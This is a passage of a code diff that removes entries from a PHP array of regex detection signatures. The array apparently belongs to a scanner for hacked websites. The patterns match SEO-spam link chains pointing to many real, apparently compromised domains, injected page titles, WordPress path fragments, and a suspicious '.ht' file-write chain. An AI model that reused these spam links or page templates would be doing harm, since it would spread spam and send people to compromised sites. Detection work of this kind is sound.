-      'pattern' => '/content\\/themes\\/guava\\/rwqumw\\/unlocked/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    994 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/lalasagnarestaurant\\.com\\/31l\\/airport\\-telephone\\-no\\.html\\>ma\\<\\/a\\>, \\<a href\\=http\\:\\/\\/figtreeaccountancy\\.co\\.uk\\/045\\/unfortunately\\-media/',
-      'label' => 'source-file tail snippet',
-    ),
-    995 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/231bain\\.com\\/e175yw\\/file\\-management\\-system\\-pdf\\.html\\>gj\\<\\/a\\>, \\<a href\\=http\\:\\/\\/figtreeaccountancy\\.co\\.uk\\/qfrd\\/essential\\-oils\\-after\\-/',
-      'label' => 'source-file tail snippet',
-    ),
-    996 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/alfaefe\\.com\\/pghtd\\/macbook\\-mdm\\-bypass\\.html\\>yr\\<\\/a\\>, \\<a href\\=http\\:\\/\\/mytraveldealdiscount\\.com\\/o3mq\\/tencent\\-app\\-store\\-english\\-apk\\./',
-      'label' => 'source-file tail snippet',
-    ),
-    997 => 
-    array (
-      'pattern' => '/Art model 3d pose tool and morphing tool mod apk/',
-      'label' => 'sample-specific literal',
-    ),
-    998 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/fortune\\.icreativelabs\\.com\\/qwan\\/bolt\\-ceo\\.html\\>mq\\<\\/a\\>, \\<a href\\=http\\:\\/\\/minhthanhbds\\.com\\/ad6q\\/gold\\-dragees\\.html\\>jc\\<\\/a\\>, \\<a href\\=h/',
-      'label' => 'source-file tail snippet',
-    ),
-    999 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>
-
-\\<html class\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Textron login\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1000 => 
-    array (
-      'pattern' => '/\\>Sngpl test questions\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1001 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>What is smart download in adm\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1002 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  \\<title\\>Best bb gun for 10 year old\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1003 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/oqo\\/grade/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1004 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/egkpainting\\.com\\/uhgt\\/reddit\\-400k\\-salary\\.html\\>zn\\<\\/a\\>, \\<a href\\=http\\:\\/\\/lifewelluniversity\\.com\\/o3ex\\/facebook\\-old\\-logo\\.html\\>qs\\<\\/a\\>/',
-      'label' => 'source-file tail snippet',
-    ),
-    1005 => 
-    array (
-      'pattern' => '/\\$?EsotericKnowledge\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    1006 => 
-    array (
-      'pattern' => '/\\>Walmart gun sales statistics\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1007 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/loyalfrench\\.com\\/w079bt\\/sgic\\-contact\\-email\\.html\\>pd\\<\\/a\\>, \\<a href\\=http\\:\\/\\/fp\\-togo\\.org\\/2xaq7mcjez\\/jupyter\\-lab\\-nodejs\\.html\\>gh\\<\\/a\\>, /',
-      'label' => 'source-file tail snippet',
-    ),
-    1008 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/moscow\\-medicine\\.ru\\/85wjds\\/vue\\-dropdown\\-menu\\.html\\>bn\\<\\/a\\>, \\<a href\\=http\\:\\/\\/cbdprom\\.com\\/cfuxx\\/zoo\\-tycoon\\-2\\-animal\\-downloads\\-free\\./',
-      'label' => 'source-file tail snippet',
-    ),
-    1009 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/loyalfrench\\.com\\/w079bt\\/osha\\-fire\\-extinguisher\\-placement\\.html\\>oi\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.centromedisalud\\.cl\\/tz6x\\/peruvian\\-cand/',
-      'label' => 'source-file tail snippet',
-    ),
-    1010 => 
-    array (
-      'pattern' => '/master\\.php\\.suspected[\\s\\S]{0,160}\\.ht"; \\$f2 \\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1011 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Ici castings\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1012 => 
-    array (
-      'pattern' => '/\\>Pix4d\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1013 => 
-    array (
-      'pattern' => '/content\\/themes\\/guava\\/rwqumw\\/p1729/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1014 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.ammahtechsavvy\\.com\\/dxehvxr\\/best\\-fsx\\-freeware\\-aircraft\\-2019\\.html\\>tf\\<\\/a\\>, \\<a href\\=http\\:\\/\\/raghebalama\\.com\\/mjono8b\\/osint\\-feed/',
-      'label' => 'source-file tail snippet',
-    ),
-    1015 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>
-
-\\<html class\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Rtings hisense\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1016 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Stm32wb55\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1017 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/jpc\\.dpi\\.ac\\/so33g\\/non\\-intractable\\-headache\\-icd\\-10\\.html\\>di\\<\\/a\\>, \\<a href\\=http\\:\\/\\/dotincludes\\.com\\/ulynmu\\/how\\-to\\-read\\-a\\-obd2\\-scanne/',
-      'label' => 'source-file tail snippet',
-    ),
-    1018 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Stamp and coin shops\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1019 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.lacargo\\.eu\\/rfzh0\\/clonezilla\\-gui\\.html\\>vi\\<\\/a\\>, \\<a href\\=http\\:\\/\\/myins\\.co\\.uk\\/ozcwz\\/surgical\\-instruments\\-importers\\-in\\-belgium\\.h/',
-      'label' => 'source-file tail snippet',
-    ),
-    1020 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/wtmi\\/ijaz/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1021 => 
-    array (
-      'pattern' => '/\\>Cant click skyrim\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1022 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/9odmtj\\/tata/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1023 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  \\<title\\>Seeing smoke like mist after suddenly waking up\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1024 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/scallion\\-lifes\\.com\\/a5ahk\\/vray\\-plants\\.html\\>k6\\<\\/a\\>, \\<a href\\=http\\:\\/\\/addawasolutions\\.com\\/s0a\\/stream\\-is\\-choppy\\-streamlabs\\.html\\>1d\\</',
-      'label' => 'source-file tail snippet',
-    ),
-    1025 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/welcome\\-forex\\.ru\\/yswzbh\\/john\\-deere\\-850\\-dozer\\-vs\\-cat\\-d6\\.html\\>mo\\<\\/a\\>, \\<a href\\=http\\:\\/\\/africanhumanistcelebrants\\.com\\/0q53jkm\\/visi/',
-      'label' => 'source-file tail snippet',
-    ),
-    1026 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.stachelhaus\\.info\\/yeg12v\\/what\\-is\\-esim\\-manager\\.html\\>kl\\<\\/a\\>, \\<a href\\=http\\:\\/\\/sks72\\.ru\\/b35\\/cre\\-marking\\-scheme\\-pdf\\.html\\>rl\\<\\/a\\>,/',
-      'label' => 'source-file tail snippet',
-    ),
-    1027 => 
-    array (
-      'pattern' => '/A7 card size/',
-      'label' => 'sample-specific literal',
-    ),
-    1028 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/startupdirectory\\.ir\\/sgce\\/pdf417\\-barcode\\-scanner\\-online\\.html\\>eu\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.k4dassociates\\.com\\/razv\\/matrix\\-webclien/',
-      'label' => 'source-file tail snippet',
-    ),
-    1029 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/cgeqx\\/hotel/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1030 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>
-
-\\<html class\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Osisoft forum\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1031 => 
-    array (
-      'pattern' => '/\\$?alfahydroksihapoissa\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    1032 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Relion alcohol swabs\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1033 => 
-    array (
-      'pattern' => '/\\$?Man_VWR_Ion_EN_Rev1\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    1034 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.chintech\\.com\\.cn\\/hfzvtib\\/softether\\-vpn\\-android\\-apk\\.html\\>o1\\<\\/a\\>, \\<a href\\=http\\:\\/\\/bmvv1995\\.com\\/whdkga\\/can\\-you\\-use\\-stiiizy\\-pod/',
-      'label' => 'source-file tail snippet',
-    ),
-    1035 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>G2o lambda\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1036 => 
-    array (
-      'pattern' => '/content\\/themes\\/guava\\/l2azy6i\\/another/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1037 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/mn8mnt\\/accenture/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1038 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/taysyz\\.ir\\/nbpwk\\/lucius\\-and\\-ginny\\-fanfiction\\-lemon\\.html\\>hu\\<\\/a\\>, \\<a href\\=http\\:\\/\\/tresusa\\.biz\\/nly0mls\\/dr\\-sweeney\\-urology\\.html\\>ar\\</',
-      'label' => 'source-file tail snippet',
-    ),
-    1039 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>
-
-\\<html class\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Cadoodle\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1040 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Wifi booter free\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1041 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/henduconsultores\\.com\\/3i8\\/top\\-10\\-richest\\-pastor\\-in\\-africa\\-2018\\.html\\>of\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.lacollinadegliulivi\\.net\\/4le\\/ela/',
-      'label' => 'source-file tail snippet',
-    ),
-    1042 => 
-    array (
-      'pattern' => '/\\$?xuqiang521\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    1043 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.successfactor\\.me\\/uzjh\\/hp\\-z600\\-motherboard\\-diagram\\.html\\>gc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/shrujais\\.com\\/wordpress\\/wp\\-content\\/themes\\/gu/',
-      'label' => 'source-file tail snippet',
-    ),
-    1044 => 
-    array (
-      'pattern' => '/\\$?SrbijaDOKUMENTARNIJelena\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    1045 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/qkk2jq8\\/boruto/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1046 => 
-    array (
-      'pattern' => '/\\$?alphanumerically\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    1047 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>
-
-\\<html class\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Betrayal kjv\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1048 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/cinema21\\.online\\/a9orn\\/new\\-impeller\\-still\\-no\\-water\\.html\\>mz\\<\\/a\\>, \\<a href\\=http\\:\\/\\/accurateopticians\\.com\\/t99\\/dapper\\-plus\\-license\\.h/',
-      'label' => 'source-file tail snippet',
-    ),
-    1049 => 
-    array (
-      'pattern' => '/content\\/themes\\/guava\\/l2azy6i\\/2018/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1050 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/tqsf\\/subject/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1051 => 
-    array (
-      'pattern' => '/\\$?manutd4life0023\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    1052 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/shakry\\.us\\/ibpv16\\/fl\\-studio\\-pluck\\-pack\\-free\\.html\\>ga\\<\\/a\\>, \\<a href\\=http\\:\\/\\/listingpro\\.inspireui\\.com\\/92comg\\/ultra\\-sans\\-pictures\\.ht/',
-      'label' => 'source-file tail snippet',
-    ),
-    1053 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/new2\\.lepnina\\.by\\/xfuo\\/krasko\\-villains\\-wiki\\.html\\>wd\\<\\/a\\>, \\<a href\\=http\\:\\/\\/reliancechauffeurs\\.com\\/6ym\\/chelsea\\-fc\\-fixtures\\-download/',
-      'label' => 'source-file tail snippet',
-    ),
-    1054 => 
-    array (
-      'pattern' => '/html\\/generatrix\\/model\\/youtubeModel/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1055 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/kukulifood\\.com\\/wc7za7\\/xml2js\\-brackets\\.html\\>fm\\<\\/a\\>, \\<a href\\=http\\:\\/\\/themillsfabrica\\.kcly\\.com\\/luiyy\\/typescript\\-function\\.html\\>rq\\</',
-      'label' => 'source-file tail snippet',
-    ),
-    1056 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/mysmartdigital\\.fr\\/rzy\\/how\\-to\\-copy\\-products\\-from\\-a\\-website\\.html\\>co\\<\\/a\\>, \\<a href\\=http\\:\\/\\/oncohope\\.net\\/vcf5\\/verizon\\-phone\\-codes\\-6/',
-      'label' => 'source-file tail snippet',
-    ),
-    1057 => 
-    array (
-      'pattern' => '/\\>Add surface information arcgis\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1058 => 
-    array (
-      'pattern' => '/\\<html itemscope\\="" itemtype\\="" class\\="no\\-js zsg\\-theme\\-modernized null" xmlns\\="" xmlns\\:og\\="\\#" xmlns\\:fb\\="" xmlns\\:product\\="\\#" lang\\="en"\\>/',
-      'label' => 'source-file head snippet',
-    ),
-    1059 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.rprhydro\\.com\\/fpoxqv\\/samsung\\-galaxy\\-s4\\-second\\-hand\\-value\\.html\\>sb\\<\\/a\\>, \\<a href\\=http\\:\\/\\/kaplanpower\\.com\\/dqkftcz\\/free\\-setup\\-bo/',
-      'label' => 'source-file tail snippet',
-    ),
-    1060 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/himmelsbygardshotell\\.se\\/vhfutf\\/glycol\\-ether\\-dpm\\.html\\>gt\\<\\/a\\>, \\<a href\\=http\\:\\/\\/osentek\\.com\\/fw3ec\\/sindoor\\-in\\-dream\\-meaning\\.html\\>n/',
-      'label' => 'source-file tail snippet',
-    ),
-    1061 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/nsd\\/mongodb/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1062 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.vgmsteel\\.co\\.za\\/1kkm\\/roblox\\-change\\-key\\-bindings\\.html\\>nl\\<\\/a\\>, \\<a href\\=http\\:\\/\\/pilatestudio360\\.com\\/eqr\\/ley\\-lines\\-egypt\\.html\\>i/',
-      'label' => 'source-file tail snippet',
-    ),
-    1063 => 
-    array (
-      'pattern' => '/\\>Dynaman subbed\\<\\/span\\>\\<\\/h1\\>
-
-
-
-            \\<\\/div\\>
-
-
-
-            \\<\\!\\-\\- mainmenu begin \\-\\-\\>
-
-            
-
-\\<ul id\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1064 => 
-    array (
-      'pattern' => '/\\>2015 bassmaster lake guntersville\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1065 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/0qv87cq\\/outlook/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1066 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Tests\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1067 => 
-    array (
-      'pattern' => '/\\>Lol season 9\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1068 => 
-    array (
-      'pattern' => '/content\\/themes\\/guava\\/rwqumw\\/rubberising/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1069 => 
-    array (
-      'pattern' => '/\\>Ballet class music\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1070 => 
-    array (
-      'pattern' => '/Knife companies list/',
-      'label' => 'sample-specific literal',
-    ),
-    1071 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/decor365\\.vn\\/1fhm\\/powershell\\-force\\-ad\\-replication\\.html\\>dt\\<\\/a\\>, \\<a href\\=http\\:\\/\\/boxblue\\.net\\/kun3w\\/pfsense\\-show\\-interfaces\\.html\\>b/',
-      'label' => 'source-file tail snippet',
-    ),
-    1072 => 
-    array (
-      'pattern' => '/\\>
-
-            
-
-\\<h1\\>Used 20 hp jet outboard for sale\\<\\/h1\\>
-
-
-
-            
-
-\\<ul class\\=[\\s\\S]{0,160}\\>
-
-\\<\\/ul\\>
-
-
-
-         \\<\\/div\\>
-
-
-
-      \\<\\/div\\>
-
-
-
-   \\<\\/div\\>
-
-
-
-\\<\\/div\\>
-
-
-
-\\<\\!\\-\\- content begin \\-\\-\\>
-
-\\<div id\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1073 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.ardexendura\\.com\\/gdyroby\\/germany\\-spare\\-parts\\-suppliers\\.html\\>sc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/kts\\-kk\\.co\\.jp\\/mnh4uqt\\/adafruit\\-fritzing\\-/',
-      'label' => 'source-file tail snippet',
-    ),
-    1074 => 
-    array (
-      'pattern' => '/\\>Phone ear speaker buzzing\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1075 => 
-    array (
-      'pattern' => '/\\>Bats in attic noise\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1076 => 
-    array (
-      'pattern' => '/true"\\>Windows 10 update assistant 1903\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1077 => 
-    array (
-      'pattern' => '/\\>2400mhz vs 2666mhz\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1078 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/ulyssav\\.us\\/nybc\\/relation\\-arithmetic\\-sequence\\-and\\-partial\\-sum\\.html\\>fx\\<\\/a\\>, \\<a href\\=http\\:\\/\\/datxanhdh\\.com\\/6utwu\\/social\\-club\\-rock/',
-      'label' => 'source-file tail snippet',
-    ),
-    1079 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/bloom\\-bottle\\.com\\/ywvcbl4el\\/mexican\\-boxing\\-entrance\\-songs\\.html\\>vl\\<\\/a\\>, \\<a href\\=http\\:\\/\\/ec2\\-13\\-233\\-154\\-33\\.ap\\-south\\-1\\.compute\\.ama/',
-      'label' => 'source-file tail snippet',
-    ),
-    1080 => 
-    array (
-      'pattern' => '/\\>Discourse sso\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1081 => 
-    array (
-      'pattern' => '/\\>Sysprep 0x80070003\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1082 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.mundumata\\.com\\/rsggzkh\\/positive\\-energy\\-synonyms\\.html\\>p4\\<\\/a\\>, \\<a href\\=http\\:\\/\\/jimo\\.ga\\/pgugb5w\\/audio\\-note\\-kit\\-1\\.html\\>s7\\<\\/a\\>, /',
-      'label' => 'source-file tail snippet',
-    ),
-    1083 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>
-
-\\<html class\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Atoto no sound\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1084 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/tienluat\\.com\\.vn\\/cj08\\/chrome\\-secure\\-shell\\-x11\\-forwarding\\.html\\>pd\\<\\/a\\>, \\<a href\\=http\\:\\/\\/kenoami\\.info\\/zw7grhttgcc\\/siler\\-percussion/',
-      'label' => 'source-file tail snippet',
-    ),
-    1085 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/topdetail\\.cz\\/ten\\/how\\-do\\-sneaker\\-raffles\\-work\\.html\\>ov\\<\\/a\\>, \\<a href\\=http\\:\\/\\/decox\\.design\\/zx3b\\/cardcaptor\\-sakura\\-episode\\-2\\.html\\>n/',
-      'label' => 'source-file tail snippet',
-    ),
-    1086 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.skyhousebuckhead\\.com\\/8b5d3n\\/industrial\\-training\\-report\\-computer\\-science\\-student\\.html\\>gq\\<\\/a\\>, \\<a href\\=http\\:\\/\\/medicalreform/',
-      'label' => 'source-file tail snippet',
-    ),
-    1087 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/xolaren\\.com\\/uneaozewo\\/montagne\\-jeunesse\\-peel\\-off\\-mask\\.html\\>ey\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.gastrodisiac\\.com\\/9sfdoq\\/mobile\\-home\\-mov/',
-      'label' => 'source-file tail snippet',
-    ),
-    1088 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/eu6bvz\\/kiddnation/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1089 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/wordpress\\.happy\\-life\\.xyz\\/snedkcopd\\/new\\-electric\\-plane\\.html\\>lv\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.risingstarpreparatoryjhs\\.com\\/haxc\\/osrs\\-/',
-      'label' => 'source-file tail snippet',
-    ),
-    1090 => 
-    array (
-      'pattern' => '/content\\/themes\\/guava\\/t2igcg\\/acer/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1091 => 
-    array (
-      'pattern' => '/content\\/languages\\/plugins\\/ipmbu\\/surface/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1092 => 
-    array (
-      'pattern' => '/images\\/galleries\\/cartelrooftop\\/40thbirthday\\/Cartel/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1093 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/ytlcement\\.com\\/96an\\/saml\\-authentication\\-failed\\.html\\>as\\<\\/a\\>, \\<a href\\=http\\:\\/\\/premiertelecare\\.com\\/fui8\\/stm32h7\\-reference\\-manual\\.h/',
-      'label' => 'source-file tail snippet',
-    ),
-    1094 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/chungcutheterra\\.info\\/dbjmjx6g\\/mirrors\\-and\\-windows\\-grade\\-7\\.html\\>h3\\<\\/a\\>, \\<a href\\=http\\:\\/\\/songfamilies\\.com\\/wordpress\\/wp\\-content\\/t/',
-      'label' => 'source-file tail snippet',
-    ),
-    1095 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.tripvaga\\.com\\/4iqs6\\/michaels\\-senior\\-discount\\-exclusions\\.html\\>nz\\<\\/a\\>, \\<a href\\=http\\:\\/\\/zimen\\-group\\.com\\/xs3dpn\\/rust\\-fire\\-arrow/',
-      'label' => 'source-file tail snippet',
-    ),
-    1096 => 
-    array (
